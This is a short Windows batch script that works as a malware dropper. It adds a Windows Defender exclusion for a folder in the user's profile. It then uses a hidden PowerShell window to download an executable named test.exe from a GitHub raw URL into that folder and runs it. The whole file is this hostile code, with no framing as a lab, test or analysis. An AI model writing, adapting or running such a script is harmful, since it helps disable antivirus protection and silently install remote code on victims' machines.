@echo off
powershell -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\tmp"
PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/Oliverhansen09/test/raw/main/test.exe -OutFile '%USERPROFILE%\tmp\test.exe'"
start "" %USERPROFILE%\tmp\test.exe
